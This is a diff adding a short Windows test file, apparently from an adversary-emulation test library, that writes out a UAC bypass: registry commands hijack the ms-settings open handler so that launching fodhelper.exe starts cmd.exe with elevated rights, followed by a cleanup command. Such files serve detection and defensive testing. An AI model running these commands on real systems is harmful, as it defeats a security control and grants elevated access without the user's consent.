@@ -1,0 +1,13 @@
+#TechniqueName: Abuse Elevation Control Mechanism: Bypass User Access Control
+#AtomicTestName: Bypass UAC using Fodhelper
+#Language: cmd
+
+#commands
+reg.exe add hkcu\software\classes\ms-settings\shell\open\command /ve /d "C:\Windows\System32\cmd.exe" /f
+reg.exe add hkcu\software\classes\ms-settings\shell\open\command /v "DelegateExecute" /f
+fodhelper.exe
+
+
+#cleanup_commands
+reg.exe delete hkcu\software\classes\ms-settings /f >nul 2>&1
+
